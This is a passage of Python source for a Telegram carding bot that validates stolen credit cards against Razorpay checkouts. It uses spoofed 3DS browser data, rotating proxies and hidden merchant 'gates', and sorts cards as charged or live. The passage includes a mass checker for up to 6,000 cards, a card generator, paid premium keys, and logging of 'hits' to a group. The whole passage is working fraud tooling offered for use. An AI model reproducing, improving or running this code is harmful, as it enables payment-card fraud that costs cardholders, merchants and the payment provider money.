                    data={"browser[java_enabled]":"false","browser[javascript_enabled]":"true",
                          "browser[timezone_offset]":"0","browser[color_depth]":"24",
                          "browser[screen_width]":"1920","browser[screen_height]":"1080",
                          "browser[language]":"en-US","auth_step":"3ds2Auth"},
                    headers={"Content-Type":"application/x-www-form-urlencoded"}, **kw)
            except: pass
        await asyncio.sleep(0.8)

        # S9b: Cancel (auto-hit mode — checks response without real charge)
        try:
            async with sess.get(
                f"https://api.razorpay.com/v1/standard_checkout/payments/{pay_id}/cancel"
                f"?key_id={key_id}&session_token={tok}&keyless_header={keyless}",
                headers={**sh,"Content-type":"application/x-www-form-urlencoded"}, **kw) as r9:
                r9t = await r9.text(errors="replace")
        except: return {"status":"approved","message":"Auth passed","bin":cc[:6]}

        if "razorpay_payment_id" in r9t:
            return {"status":"charged","message":"Payment Successful","payment_id":pay_id,"bin":cc[:6]}

        try: r9d = json.loads(r9t)
        except: return {"status":"declined","message":"Unknown"}

        err   = r9d.get("error",{}) or {}
        desc  = _gs(err,"description").replace(" Try another payment method or contact your bank for details.","").strip()
        code  = _gs(err,"reason")
        label = f"{desc} ({code})" if code else desc or "Unknown"
        if _is_live_signal(desc, code):
            return {"status":"approved","message":label,"bin":cc[:6]}
        return {"status":"declined","message":label}

# ═══════════════════════════════════════════════════════
# HIT LOGGER — logs to group, CC info MASKED (privacy)
# ═══════════════════════════════════════════════════════
def mask_cc(cc: str) -> str:
    """Show only BIN6 + last 2 digits, mask rest."""
    if len(cc) >= 10:
        return f"{cc[:6]}{'●'*(len(cc)-8)}{cc[-2:]}"
    return f"{cc[:4]}{'●'*(len(cc)-4)}"

async def log_hit(ctx: ContextTypes.DEFAULT_TYPE, hit_type: str,
                  card: str, amount_inr: int, user, response: str) -> None:
    if not GROUP_ID or GROUP_ID == -1009876543210: return
    try:
        parts   = card.split("|")
        cc_raw  = parts[0] if parts else card
        cc_mask = mask_cc(cc_raw)
        mm      = parts[1] if len(parts) > 1 else "??"
        yy      = parts[2] if len(parts) > 2 else "??"
        net     = net_display(cc_raw)
        ulink   = f'<a href="tg://user?id={user.id}">{safe(user.first_name)}</a>'
        uname   = f"@{user.username}" if user.username else "N/A"
        ts      = datetime.now().strftime("%H:%M · %d %b")
        bin6    = cc_raw[:6]
        # Fetch bin info for context
        binfo   = await lookup_bin(bin6)

        if hit_type == "CHARGED":
            text = (
                f"{e('charged')} <b>CHARGED</b> — {ulink}\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"{e('bin')}   BIN: <code>{bin6}</code> · {net}\n"
                f"{e('coin')}  Amt: <b>₹{amount_inr}</b>\n"
                f"{e('gate')}  Resp: <code>{safe(response[:70])}</code>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"{e('user')}  By:   {ulink} (<code>{user.id}</code>)\n"
                f"{e('clock')} Time: <code>{ts}</code>\n"
                f"{e('fire')}  Bot:  <b>{BOT_NAME}</b> · <b>{BOT_CREATOR}</b>"
            )
        else:  # APPROVED / LIVE
            text = (
                f"{e('approved')} <b>APPROVED</b> — {ulink}\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"{e('bin')}   BIN: <code>{bin6}</code> · {net}\n"
                f"{e('bolt')}  Resp: <code>{safe(response[:70])}</code>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"{e('user')}  By:   {ulink} (<code>{user.id}</code>)\n"
                f"{e('clock')} Time: <code>{ts}</code>\n"
                f"{e('fire')}  Bot:  <b>{BOT_NAME}</b> · <b>{BOT_CREATOR}</b>"
            )
        await ctx.bot.send_message(GROUP_ID, text, parse_mode=ParseMode.HTML)
        await redis.hincrby(RK_STATS, "total_hits", 1)
    except Exception as ex:
        logger.warning(f"log_hit failed: {ex}")

# ═══════════════════════════════════════════════════════
# KEY / PLAN SYSTEM
# ═══════════════════════════════════════════════════════
def _gen_key() -> str:
    chars = string.ascii_uppercase + string.digits
    s = lambda: "".join(secrets.choice(chars) for _ in range(4))
    return f"NAGU-{s()}-{s()}-{s()}"

async def create_keys(days: int, count: int, by: int) -> List[str]:
    keys = []
    for _ in range(count):
        k = _gen_key()
        await redis.hset(f"bot:key:{k}", "days",    str(days))
        await redis.hset(f"bot:key:{k}", "made_at", str(int(time.time())))
        await redis.hset(f"bot:key:{k}", "made_by", str(by))
        await redis.hset(f"bot:key:{k}", "used_by", "")
        await redis.sadd(RK_KEYS, k)
        keys.append(k)
    return keys

async def redeem_key(key: str, uid: int) -> Tuple[bool, str]:
    key = key.upper().strip()
    kd  = await redis.hgetall(f"bot:key:{key}")
    if not kd:                    return False, "Key not found."
    if kd.get("used_by"):         return False, "Already redeemed."
    if key not in await redis.smembers(RK_KEYS):
        return False, "Key expired or invalid."
    days = int(kd.get("days", 0))
    if days <= 0:                 return False, "Invalid key (0 days)."
    expiry   = time.time() + days * 86400
    plan_nm  = f"{days}-Day Premium"
    await redis.hset(f"bot:key:{key}", "used_by", str(uid))
    await redis.srem(RK_KEYS, key)
    await redis.hset(f"bot:u:{uid}", "plan_name", plan_nm)
    await redis.hset(f"bot:u:{uid}", "plan_exp",  str(expiry))
    await redis.hset(f"bot:u:{uid}", "activated",  str(int(time.time())))
    exp_str = datetime.fromtimestamp(expiry).strftime("%Y-%m-%d %H:%M UTC")
    return True, f"{plan_nm} — expires {exp_str}"

async def give_plan(uid: int, days: int, name: str, by: int) -> str:
    expiry = time.time() + days * 86400
    await redis.hset(f"bot:u:{uid}", "plan_name", name)
    await redis.hset(f"bot:u:{uid}", "plan_exp",  str(expiry))
    await redis.hset(f"bot:u:{uid}", "given_by",  str(by))
    return datetime.fromtimestamp(expiry).strftime("%Y-%m-%d %H:%M UTC")

# ═══════════════════════════════════════════════════════
# KEYBOARDS
# ═══════════════════════════════════════════════════════
def kb_main() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [btn(f"{e('card')} Check CC",  "kb_rz"),    btn(f"{e('mass')} Mass Check","kb_mrz")],
        [btn(f"{e('user')} Profile",   "kb_profile"),btn(f"{e('plan')} Plans",     "kb_plans")],
        [btn(f"{e('bin')}  BIN Lookup","kb_bin"),   btn(f"{e('info')} Help",       "kb_help")],
        [btn(f"{e('channel')} Channel",url=CHANNEL_LINK),
         btn(f"{e('group')} Group",    url=GROUP_LINK)],
    ])

def kb_admin() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [btn(f"{e('card')} Check CC",  "kb_rz"),    btn(f"{e('mass')} Mass Check","kb_mrz")],
        [btn(f"{e('user')} Profile",   "kb_profile"),btn(f"{e('stats')} Stats",   "kb_stats")],
        [btn(f"{e('bin')}  BIN Lookup","kb_bin"),   btn(f"{e('info')} Help",      "kb_help")],
        [btn(f"{e('gear')} Admin Panel","kb_admin_panel")],
    ])

def kb_mrz_results(uid: int) -> Optional[InlineKeyboardMarkup]:
    r = mrz_results.get(uid)
    if not r: return None
    rows = []
    ch = r.get("charged", []);   ap = r.get("approved", []);  de = r.get("dead", []);  er = r.get("errors", [])
    if ch: rows.append([btn(f"💰 Charged ({len(ch)})",  f"dl_charged_{uid}")])
    if ap: rows.append([btn(f"✅ Approved ({len(ap)})", f"dl_approved_{uid}")])
    if de: rows.append([btn(f"❌ Dead ({len(de)})",     f"dl_dead_{uid}")])
    if er: rows.append([btn(f"⚠️ Errors ({len(er)})",   f"dl_errors_{uid}")])
    rows.append([btn(f"📦 Download All", f"dl_all_{uid}")])
    return InlineKeyboardMarkup(rows) if rows else None

async def _send_file(message, content: str, filename: str, caption: str) -> None:
    bio = BytesIO(content.encode()); bio.name = filename
    for attempt in range(2):
        try:
            bio.seek(0)
            await message.reply_document(document=bio, caption=caption, parse_mode=ParseMode.HTML)
            return
        except Exception as ex:
            logger.error(f"File send attempt {attempt+1}: {ex}")
            if attempt == 0: await asyncio.sleep(1.5)

# ═══════════════════════════════════════════════════════
# ANIMATED PROGRESS BAR HELPER
# ═══════════════════════════════════════════════════════
ANIM_FRAMES = ["⠋","⠙","⠸","⠴","⠦","⠇"]
_frame_idx: Dict[int, int] = defaultdict(int)

def spin(uid: int) -> str:
    f = ANIM_FRAMES[_frame_idx[uid] % len(ANIM_FRAMES)]
    _frame_idx[uid] += 1
    return f

def progress_bar(done: int, total: int, width: int = 16) -> str:
    if total == 0: return "░" * width
    filled = int(width * done / total)
    return "█" * filled + "░" * (width - filled)

# ═══════════════════════════════════════════════════════
# /start
# ═══════════════════════════════════════════════════════
async def cmd_start(u: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    uid  = u.effective_user.id
    user = u.effective_user
    if await is_banned(uid):
        await u.message.reply_text(f"{e('ban')} <b>Banned.</b>", parse_mode=ParseMode.HTML); return
    if not await enforce_join(u, ctx): return

    role     = await get_role(uid)
    auth     = await is_auth(uid)
    ud       = await redis.hgetall(f"bot:u:{uid}")
    plan_nm  = ud.get("plan_name","Free")
    plan_exp = ud.get("plan_exp","")
    exp_str  = "—"
    if plan_exp:
        try:
            rem = float(plan_exp) - time.time()
            if rem > 0:
                d, rem = divmod(int(rem), 86400); h = rem // 3600
                exp_str = f"{d}d {h}h"
            else: exp_str = "Expired"
        except: exp_str = "—"

    total_ch = await redis.hget(RK_STATS, "total_hits") or "0"

    ri = (e("crown") if is_admin(uid) else e("star") if await is_sudo(uid) else
          e("star") if auth else e("eye"))

    kb = kb_admin() if (is_admin(uid) or await is_sudo(uid)) else kb_main()

    await u.message.reply_text(
        f"{e('fire')} <b>NAGU ULTRA BOT</b> {e('bolt')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"{e('user')} Welcome, <b>{safe(user.first_name)}</b>!\n\n"
        f"{e('plan')} <b>Identity</b>\n"
        f"  ► name · <code>{safe(user.first_name)}</code>\n"
        f"  ► id · <code>{uid}</code>\n"
        f"  ► rank · {ri} <b>{safe(role)}</b>\n\n"
        f"{e('plan')} <b>Plan</b>\n"
        f"  ► tier · <b>{safe(plan_nm)}</b>\n"
        f"  ► exp · <code>{exp_str}</code>\n\n"
        f"{e('stats')} <b>Stats</b>\n"
        f"  ► total hits · <code>{total_ch}</code>\n\n"
        f"{e('sparkle')} keep grinding · hits matter",
        parse_mode=ParseMode.HTML, reply_markup=kb, disable_web_page_preview=True)

# ═══════════════════════════════════════════════════════
# /profile
# ═══════════════════════════════════════════════════════
@need_join
async def cmd_profile(u: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    uid  = u.effective_user.id
    user = u.effective_user
    ud   = await redis.hgetall(f"bot:u:{uid}")
    role = await get_role(uid)
    plan_nm  = ud.get("plan_name","Free")
    plan_exp = ud.get("plan_exp","")
    exp_str  = "No active plan"; valid = False
    age_str  = "—"
    if plan_exp:
        try:
            exp_ts = float(plan_exp)
            exp_dt = datetime.fromtimestamp(exp_ts)
            exp_str = exp_dt.strftime("%Y-%m-%d %H:%M UTC")
            valid   = exp_ts > time.time()
            act_ts  = ud.get("activated","")
            if act_ts:
                age_days = (time.time() - float(act_ts)) / 86400
                age_str  = f"{int(age_days)}d"
        except: pass

    ri = (e("crown") if is_admin(uid) else e("star") if await is_sudo(uid) else
          e("star") if valid else e("eye"))
    un = f"@{user.username}" if user.username else "N/A"

    await u.message.reply_text(
        f"{e('star')} <b>PROFILE</b> — User Card\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"{e('user')} <b>Identity</b>\n"
        f"  ► name · <b>{safe(user.first_name)}</b>\n"
        f"  ► username · <code>{safe(un)}</code>\n"
        f"  ► id · <code>{uid}</code>\n"
        f"  ► age · <code>{age_str}</code>\n\n"
        f"{e('plan')} <b>Plan</b>\n"
        f"  ► tier · {ri} <b>{safe(plan_nm)}</b>\n"
        f"  ► exp · <code>{exp_str}</code>\n\n"
        f"{e('stats')} <b>Status</b>\n"
        f"  ► rank · <b>{safe(role)}</b>\n"
        f"  ► access · {'<b>ACTIVE</b>' if await is_auth(uid) else '<b>FREE</b>'}",
        parse_mode=ParseMode.HTML, reply_markup=kb_main())

# ═══════════════════════════════════════════════════════
# /plans
# ═══════════════════════════════════════════════════════
async def cmd_plans(u: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    uid = u.effective_user.id
    if await is_banned(uid): return
    await u.message.reply_text(
        f"{e('plan')} <b>PLANS</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"{e('user')} <b>Free Plan</b>\n"
        f"  ► /rz — single card check\n"
        f"  ► /bin — BIN lookup\n"
        f"  ► /start /profile /plans\n\n"
        f"{e('star')} <b>Premium Plan</b>\n"
        f"  ► /mrz — mass check (6,000 cards)\n"
        f"  ► /gen — card generation\n"
        f"  ► /split — file splitting\n"
        f"  ► /rz — single check\n"
        f"  ► /bin — BIN lookup\n"
        f"  ► {e('infinity')} unlimited checks\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{e('key')} Contact {BOT_CREATOR} to buy\n"
        f"{e('redeem')} <code>/redeem KEY</code> to activate\n"
        f"{e('channel')} <a href='{CHANNEL_LINK}'>Channel</a> · <a href='{GROUP_LINK}'>Group</a>",
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup([
            [btn(f"{e('key')} Buy Premium", "plans_buy")],
            [btn(f"{e('star')} My Plan",    "kb_profile")],
        ]), disable_web_page_preview=True)

# ═══════════════════════════════════════════════════════
# /redeem
# ═══════════════════════════════════════════════════════
@need_join
async def cmd_redeem(u: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    uid = u.effective_user.id
    if not ctx.args:
        await u.message.reply_text(
            f"{e('key')} Usage: <code>/redeem NAGU-XXXX-XXXX-XXXX</code>",
            parse_mode=ParseMode.HTML); return
    key = ctx.args[0].upper().strip()
    msg = await u.message.reply_text(f"{e('loading')} Validating key...", parse_mode=ParseMode.HTML)
    ok, info = await redeem_key(key, uid)
    if ok:
        await msg.edit_text(
            f"{e('check')} <b>Key Activated!</b>\n\n"
            f"{e('key')}  Key: <code>{safe(key)}</code>\n"
            f"{e('plan')} {safe(info)}\n\n"
            f"{e('sparkle')} Premium unlocked!", parse_mode=ParseMode.HTML)
    else:
        await msg.edit_text(
            f"{e('cross')} <b>Failed:</b> {safe(info)}\n\n"
            f"Contact {BOT_CREATOR} for a valid key.", parse_mode=ParseMode.HTML)

# ═══════════════════════════════════════════════════════
# /bin  — VBV/3DS verdict + full card info
# ═══════════════════════════════════════════════════════
@need_join
async def cmd_bin(u: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    uid = u.effective_user.id
    bin6 = ctx.args[0] if ctx.args else None
    if not bin6:
        await u.message.reply_text(
            f"{e('bin')} Usage: <code>/bin 411111</code>", parse_mode=ParseMode.HTML); return
    bin6 = "".join(c for c in bin6 if c.isdigit())[:8]
    if len(bin6) < 4:
        await u.message.reply_text(f"{e('error')} BIN too short.", parse_mode=ParseMode.HTML); return
    msg = await u.message.reply_text(
        f"{e('loading')} Looking up <code>{bin6}</code>...", parse_mode=ParseMode.HTML)
    info = await lookup_bin(bin6)
    flag = info.get("flag","")
    await msg.edit_text(
        f"{e('search')} <b>BIN LOOKUP</b> — {bin6}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"{e('card')} <b>Card</b>\n"
        f"  ► brand · <b>{info['brand'] or info['scheme']}</b>\n"
        f"  ► type · <b>{info['type']}</b>\n"
        f"  ► level · <b>{info['level']}</b>\n\n"
        f"{e('refresh')} <b>Issuer</b>\n"
        f"  ► bank · <b>{safe(info['bank'])}</b>\n"
        f"  ► ctry · <b>{safe(info['country'])}</b> {flag}\n\n"
        f"{e('lock')} <b>3DS Info</b>\n"
        f"  ► type · <b>{info['vbv_type']}</b>\n"
        f"  ► 3ds · {'required' if info['needs_3ds'] else 'not required'}\n"
        f"  ► ease · <b>{info['ease']}</b>\n\n"
        f"{e('star')} powered by {BOT_NAME}",
        parse_mode=ParseMode.HTML)

# ═══════════════════════════════════════════════════════
# /help
# ═══════════════════════════════════════════════════════
@need_join
async def cmd_help(u: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    uid = u.effective_user.id
    await u.message.reply_text(
        f"{e('info')} <b>Command List</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"{e('star')} <code>/rz</code> cc|mm|yy|cvv — Check a CC\n"
        f"{e('mass')} <code>/mrz</code> (send .txt) — Mass check\n"
        f"{e('search')} <code>/bin</code> 438854 — BIN lookup\n"
        f"{e('key')} <code>/redeem</code> key — Redeem key\n"
        f"{e('user')} <code>/profile</code> — Your profile\n"
        f"{e('plan')} <code>/plans</code> — View plans\n"
        f"{e('stop')} <code>/mrzstop</code> — Stop mass job\n\n"
        f"{e('star')} <b>Premium only:</b>\n"
        f"  {e('mass')} /mrz — up to 6,000 cards\n"
        f"  {e('card')} /gen BIN count — Generate cards\n"
        f"  {e('file')} /split N — Split .txt file\n\n"
        f"{e('channel')} <a href='{CHANNEL_LINK}'>Channel</a> · <a href='{GROUP_LINK}'>Group</a>",
        parse_mode=ParseMode.HTML, reply_markup=kb_main(), disable_web_page_preview=True)

# ═══════════════════════════════════════════════════════
# /rz — Single CC check (free + premium)
# ═══════════════════════════════════════════════════════
@need_join
async def cmd_rz(u: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    uid  = u.effective_user.id
    user = u.effective_user

    card_str = None
    if ctx.args:
        card_str = ctx.args[0]
    elif u.message.reply_to_message and u.message.reply_to_message.text:
        lines = u.message.reply_to_message.text.strip().splitlines()
        card_str = lines[0].strip() if lines else None

    if not card_str:
        await u.message.reply_text(
            f"{e('card')} <b>Usage:</b>\n"
            f"  <code>/rz cc|mm|yy|cvv</code>\n"
            f"  Or reply to a card with <code>/rz</code>\n\n"
            f"  ex · <code>/rz 4111111111111111|12|26|123</code>",
            parse_mode=ParseMode.HTML); return

    parsed = parse_cc(card_str)
    if not parsed:
        await u.message.reply_text(
            f"{e('error')} Invalid format. Use: <code>cc|mm|yy|cvv</code>",
            parse_mode=ParseMode.HTML); return

    cc, mm, yy, cvv = parsed
    net = net_display(cc)

    # Get sites + proxies (hidden)
    sites_raw = await redis.lrange(RK_SITES, 0, -1)
    if not sites_raw:
        await u.message.reply_text(
            f"{e('error')} No gates loaded. Contact admin.", parse_mode=ParseMode.HTML); return

    proxies = await get_live_proxies(auto_remove=True)
    px = pick_proxy(proxies)

    msg = await u.message.reply_text(
        f"{spin(uid)} <b>Checking...</b>\n\n"
        f"{e('card')}  CC: <code>{cc[:6]}●●●●●●{cc[-2:]}</code>\n"
        f"{e('bin')}   Net: {net}\n"
        f"{e('gate')}  Gate: <code>Razorpay</code>\n"
        f"{e('loading')} Running flow...",
        parse_mode=ParseMode.HTML)

    # Find a working site
    UA = _gen_ua()
    site_data = None
    for surl in random.sample(sites_raw, min(4, len(sites_raw))):
        sd = await load_site_data(surl, UA, px, auto_remove=True)
        if sd: site_data = sd; break

    if not site_data:
        await msg.edit_text(
            f"{e('error')} All gates offline. Try again later.", parse_mode=ParseMode.HTML); return

    t0     = time.monotonic()
    result = await check_card(cc, mm, yy, cvv, site_data, px)
    elapsed= round((time.monotonic() - t0), 1)

    status   = result.get("status", "error")
    response = result.get("message", "")
    ts       = datetime.now().strftime("%H:%M:%S")
    binfo    = await lookup_bin(cc[:6])

    if status == "charged":
        await msg.edit_text(
            f"{e('charged')} <b>CHARGED</b> — {safe(user.first_name)}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{e('card')}  CC:   <code>{cc[:6]}●●●●●●{cc[-2:]}</code> | {mm}/{yy}\n"
            f"{e('bin')}   Net:  {net} · <b>{binfo['level']}</b>\n"
            f"{e('gate')}  Gate: <code>Razorpay</code>\n"
            f"{e('bolt')}  Resp: <b>{safe(response[:80])}</b>\n"
            f"{e('clock')} Time: <code>{elapsed}s</code> · {ts}",
            parse_mode=ParseMode.HTML)
        await log_hit(ctx, "CHARGED", f"{cc}|{mm}|{yy}|{cvv}", 1, user, response)
        await redis.hincrby(RK_STATS, "total_charged", 1)
    elif status == "approved":
        await msg.edit_text(
            f"{e('approved')} <b>APPROVED</b> — {safe(user.first_name)}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{e('card')}  CC:   <code>{cc[:6]}●●●●●●{cc[-2:]}</code> | {mm}/{yy}\n"
            f"{e('bin')}   Net:  {net} · <b>{binfo['level']}</b>\n"
            f"{e('gate')}  Gate: <code>Razorpay</code>\n"
            f"{e('bolt')}  Resp: <b>{safe(response[:80])}</b>\n"
            f"{e('clock')} Time: <code>{elapsed}s</code> · {ts}",
            parse_mode=ParseMode.HTML)
        await log_hit(ctx, "APPROVED", f"{cc}|{mm}|{yy}|{cvv}", 1, user, response)
        await redis.hincrby(RK_STATS, "total_approved", 1)
    elif status == "declined":
        await msg.edit_text(
            f"{e('declined')} <b>DECLINED</b>\n"
            f"{e('card')}  CC: <code>{cc[:6]}●●●●●●{cc[-2:]}</code>\n"
            f"{e('bolt')}  {safe(response[:80])}\n"
            f"{e('clock')} {elapsed}s · {ts}",
            parse_mode=ParseMode.HTML)
    else:
        await msg.edit_text(
            f"{e('error')} <b>Error</b>\n{safe(response[:80])}",
            parse_mode=ParseMode.HTML)

# ═══════════════════════════════════════════════════════
# /mrz — Mass check (PREMIUM ONLY, up to 6000 cards)
# ═══════════════════════════════════════════════════════
@need_join
async def cmd_mrz(u: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    uid  = u.effective_user.id
    user = u.effective_user

    # Premium check — mrz is PREMIUM ONLY
    if not is_admin(uid) and not await is_sudo(uid) and not await has_plan(uid):
        await u.message.reply_text(
            f"{e('lock')} <b>Premium Required</b>\n\n"
            f"{e('mass')} /mrz needs a premium plan\n"
            f"{e('plan')} Use /plans to see options\n"
            f"{e('key')} Use /redeem to activate",
            parse_mode=ParseMode.HTML); return

    # Prevent double-run
    ev = active_mrz.get(uid)
    if ev and not ev.is_set():
        await u.message.reply_text(
            f"{e('error')} Mass check already running!\n"
            f"Use /mrzstop to stop it first.",
            parse_mode=ParseMode.HTML); return

    # Get file
    doc = None
    if u.message.document: doc = u.message.document
    elif u.message.reply_to_message and u.message.reply_to_message.document:
        doc = u.message.reply_to_message.document

    if not doc:
        await u.message.reply_text(
            f"{e('mass')} <b>Mass Razorpay Checker</b>\n\n"
            f"  cmd · <code>/mrz</code>\n"
            f"  txt · reply or attach .txt with /mrz\n"
            f"  ex · <code>/mrz</code> (attach file)\n\n"
            f"{e('star')} Max cards: <code>{MAX_MRZ_CARDS:,}</code>\n"
            f"{e('card')} Format: <code>cc|mm|yy|cvv</code> per line",
            parse_mode=ParseMode.HTML); return

    if not (doc.file_name or "").lower().endswith(".txt"):
        await u.message.reply_text(
            f"{e('error')} Only .txt files supported.", parse_mode=ParseMode.HTML); return

    status_msg = await u.message.reply_text(
        f"{e('loading')} Downloading file...", parse_mode=ParseMode.HTML)

    try:
        buf = BytesIO()
        tgf = await doc.get_file()
        await tgf.download_to_memory(out=buf)
        buf.seek(0)
        try:    content = buf.read().decode("utf-8")
        except: buf.seek(0); content = buf.read().decode("utf-8", errors="replace")
    except Exception as ex:
        await status_msg.edit_text(
            f"{e('error')} Download failed: {safe(str(ex)[:60])}", parse_mode=ParseMode.HTML); return

    raw_lines = [l.strip() for l in content.splitlines() if l.strip()]
    cards_raw = [l for l in raw_lines if parse_cc(l) is not None]
    skipped   = len(raw_lines) - len(cards_raw)
    total_all = len(cards_raw)

    if not cards_raw:
        await status_msg.edit_text(
            f"{e('error')} No valid cards found.\nExpected: <code>cc|mm|yy|cvv</code>",
            parse_mode=ParseMode.HTML); return

    # Enforce limit
    if total_all > MAX_MRZ_CARDS:
        skipped += total_all - MAX_MRZ_CARDS
        cards_raw = cards_raw[:MAX_MRZ_CARDS]

    total = len(cards_raw)

    # Show skipped info
    if skipped > 0:
        await u.message.reply_text(
            f"{e('folder')} <b>SKIPPED CARDS</b> — {skipped} cards\n\n"
            f"  ► limit · {MAX_MRZ_CARDS:,} (Premium)\n"
            f"  ► skipped · {skipped}",
            parse_mode=ParseMode.HTML)

    sites_raw = await redis.lrange(RK_SITES, 0, -1)
    if not sites_raw:
        await status_msg.edit_text(
            f"{e('error')} No gates loaded. Contact admin.", parse_mode=ParseMode.HTML); return

    stop_ev = asyncio.Event()
    active_mrz[uid] = stop_ev

    # Init result storage
    mrz_results[uid] = {"charged": [], "approved": [], "dead": [], "errors": []}

    await status_msg.edit_text(
        f"{e('loading')} <b>Phase 1/3 — Checking Proxies...</b>\n\n"
        f"{e('proxy')} Scanning and removing dead proxies...",
        parse_mode=ParseMode.HTML)

    live_pxs = await get_live_proxies(auto_remove=True)

    if stop_ev.is_set():
        await status_msg.edit_text(f"{e('stop')} Stopped.", parse_mode=ParseMode.HTML)
        active_mrz.pop(uid, None); return

    await status_msg.edit_text(
        f"{e('loading')} <b>Phase 2/3 — Loading Gates...</b>\n\n"
        f"{e('proxy')} Proxies: {e('check')} <code>{len(live_pxs)}</code> live\n"
        f"{e('lock')} Gates are confidential",
        parse_mode=ParseMode.HTML)

    live_sites = await get_live_sites(live_pxs)

    if stop_ev.is_set():
        await status_msg.edit_text(f"{e('stop')} Stopped.", parse_mode=ParseMode.HTML)
        active_mrz.pop(uid, None); return

    if not live_sites:
        await status_msg.edit_text(
            f"{e('error')} No active gates. Contact admin.", parse_mode=ParseMode.HTML)
        active_mrz.pop(uid, None); return

    start_time = time.time()
    checked = charged_ct = approved_ct = dead_ct = error_ct = 0
    last_edit = time.time()
    sem = asyncio.Semaphore(MASS_CONCURRENT)
    result_q: asyncio.Queue = asyncio.Queue()
    site_idx = proxy_idx = 0

    def _bar() -> str:
        elapsed  = int(time.time() - start_time)
        rate     = (charged_ct + approved_ct) / max(checked, 1) * 100
        cps      = checked / max(elapsed, 1)
        eta_s    = int((total - checked) / max(cps, 0.1))
        bar      = progress_bar(checked, total)
        spn      = spin(uid)
        workers  = min(MASS_CONCURRENT, total - checked)
        queue    = total - checked
        return (
            f"{e('bolt')} <b>RAZORPAY MASS</b> — {int(checked/total*100) if total else 0}%\n\n"
            f"  ► workers · {workers}w · queue · {queue}\n"
            f"  <code>[{bar}]</code> <code>{checked:,} / {total:,}</code>\n\n"
            f"{e('stats')} <b>Hit Count</b> {spn}\n"
            f"  ► {e('charged')} Charged · <code>{charged_ct}</code>\n"
            f"  ► {e('approved')} Approved · <code>{approved_ct}</code>\n"
            f"  ► {e('dead')} DEAD · <code>{dead_ct}</code>\n"
            f"  ► {e('error')} Error · <code>{error_ct}</code>\n\n"
            f"  ► elapsed · <code>{elapsed//60}m {elapsed%60}s</code>\n"
            f"  ► hit rate · <code>{rate:.1f}%</code>\n"
            f"  ► eta · <code>{eta_s//60}m {eta_s%60}s</code>\n\n"
            f"{e('stop')} /mrzstop to stop"
        )

    async def _worker(card_line: str):
        nonlocal site_idx, proxy_idx
        async with sem:
            if stop_ev.is_set():
                await result_q.put({"status":"STOPPED","card":card_line,"message":""}); return
            parsed = parse_cc(card_line)
            if not parsed:
                await result_q.put({"status":"error","card":card_line,"message":"Parse error"}); return
            cc_w, mm_w, yy_w, cvv_w = parsed
            site = live_sites[site_idx % len(live_sites)]
            px   = live_pxs[proxy_idx % len(live_pxs)] if live_pxs else None
            site_idx += 1; proxy_idx += 1
            res = await check_card(cc_w, mm_w, yy_w, cvv_w, site, px)
            res["card"] = card_line
            await result_q.put(res)

    tasks = [asyncio.create_task(_worker(c)) for c in cards_raw]

    for _ in range(total):
        if stop_ev.is_set(): break
        res = await result_q.get()
        checked += 1
        status   = res.get("status","error")
        response = res.get("message","")
        card_line = res.get("card","")
        parsed   = parse_cc(card_line)

        if parsed:
            cc_r, mm_r, yy_r, cvv_r = parsed
            net_r    = net_display(cc_r)
            cc_mask  = mask_cc(cc_r)
            card_full = f"{cc_r}|{mm_r}|{yy_r}|{cvv_r}"
        else:
            cc_r = ""; net_r = "⬛"; cc_mask = "????"; card_full = card_line

        ts = datetime.now().strftime("%H:%M:%S")

        if status == "charged":
            charged_ct += 1
            mrz_results[uid]["charged"].append(card_full)
            await ctx.bot.send_message(
                u.effective_chat.id,
                f"{e('charged')} <b>CHARGED</b> · {net_r}\n"
                f"  {e('card')} <code>{cc_mask}</code> | {mm_r}/{yy_r}\n"
                f"  {e('bolt')} {safe(response[:70])}\n"
                f"  {e('clock')} {ts}",
                parse_mode=ParseMode.HTML)
            await log_hit(ctx, "CHARGED", card_full, 1, user, response)
            await redis.hincrby(RK_STATS, "total_charged", 1)
            await asyncio.sleep(0.3)
        elif status == "approved":
            approved_ct += 1
            mrz_results[uid]["approved"].append(card_full)
            await ctx.bot.send_message(
                u.effective_chat.id,
                f"{e('approved')} <b>APPROVED</b> · {net_r}\n"
                f"  {e('card')} <code>{cc_mask}</code> | {mm_r}/{yy_r}\n"
                f"  {e('bolt')} {safe(response[:70])}\n"
                f"  {e('clock')} {ts}",
                parse_mode=ParseMode.HTML)
            await log_hit(ctx, "APPROVED", card_full, 1, user, response)
            await redis.hincrby(RK_STATS, "total_approved", 1)
            await asyncio.sleep(0.3)
        elif status == "STOPPED":
            break
        elif status == "error":
            error_ct += 1
            mrz_results[uid]["errors"].append(card_line)
        else:
            dead_ct += 1
            mrz_results[uid]["dead"].append(card_line)

        # Update progress every 2.5s
        if time.time() - last_edit >= 2.5:
            try:
                await status_msg.edit_text(_bar(), parse_mode=ParseMode.HTML)
                last_edit = time.time()
            except: pass

    for t in tasks: t.cancel()
    await asyncio.gather(*tasks, return_exceptions=True)
    active_mrz.pop(uid, None)

    elapsed = int(time.time() - start_time)
    stopped = stop_ev.is_set()
